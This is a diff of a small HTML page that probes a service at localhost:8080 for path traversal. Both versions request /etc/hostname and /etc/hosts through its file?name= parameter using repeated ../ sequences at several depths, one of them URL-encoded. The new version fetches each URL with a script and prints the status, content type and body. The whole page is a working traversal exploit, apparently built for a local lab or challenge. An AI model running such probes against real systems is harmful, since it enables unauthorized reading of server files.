@@ -1,12 +1,12 @@
-<!doctype html>
-<html><head><meta charset="utf-8"><title>CAT CAS 8080 traversal depth v17</title>
-<style>body{font:15px monospace}section{break-inside:avoid;margin:10px 0}iframe{width:100%;height:145px;border:2px solid #333}</style></head><body>
-<h1>CASI localhost:8080 file traversal depth</h1>
-<section><h2>1 depth 5 hostname</h2><iframe src="http://127.0.0.1:8080/file?name=../../../../../etc/hostname"></iframe></section>
-<section><h2>2 depth 6 hostname</h2><iframe src="http://127.0.0.1:8080/file?name=../../../../../../etc/hostname"></iframe></section>
-<section><h2>3 depth 8 hostname</h2><iframe src="http://127.0.0.1:8080/file?name=../../../../../../../../etc/hostname"></iframe></section>
-<section><h2>4 depth 10 hostname</h2><iframe src="http://127.0.0.1:8080/file?name=../../../../../../../../../../etc/hostname"></iframe></section>
-<section><h2>5 depth 12 hostname</h2><iframe src="http://127.0.0.1:8080/file?name=../../../../../../../../../../../../etc/hostname"></iframe></section>
-<section><h2>6 depth 8 hosts</h2><iframe src="http://127.0.0.1:8080/file?name=../../../../../../../../etc/hosts"></iframe></section>
-<section><h2>7 encoded depth 8 hostname</h2><iframe src="http://127.0.0.1:8080/file?name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fhostname"></iframe></section>
-</body></html>
+<!doctype html><html><head><meta charset="utf-8"><title>CAT CAS 8080 fetch bodies v18</title><style>body{font:16px monospace;white-space:pre-wrap}pre{border:2px solid #333;padding:12px}</style></head><body><h1>CASI localhost:8080 file fetch results</h1><pre id="out">running</pre><script>
+const tests=[
+['d5-hostname','../../../../../etc/hostname'],
+['d6-hostname','../../../../../../etc/hostname'],
+['d8-hostname','../../../../../../../../etc/hostname'],
+['d10-hostname','../../../../../../../../../../etc/hostname'],
+['d12-hostname','../../../../../../../../../../../../etc/hostname'],
+['d8-hosts','../../../../../../../../etc/hosts']];
+(async()=>{const lines=[];for(const [label,name] of tests){const u='http://127.0.0.1:8080/file?name='+encodeURIComponent(name);try{const r=await fetch(u,{cache:'no-store'});const t=await r.text();lines.push(label+' STATUS='+r.status+' TYPE='+r.headers.get('content-type')+' BODY='+JSON.stringify(t.slice(0,1000)));}catch(e){lines.push(label+' ERROR='+e.name+':'+e.message)}}document.getElementById('out').textContent=lines.join('
+
+')})();
+</script></body></html>
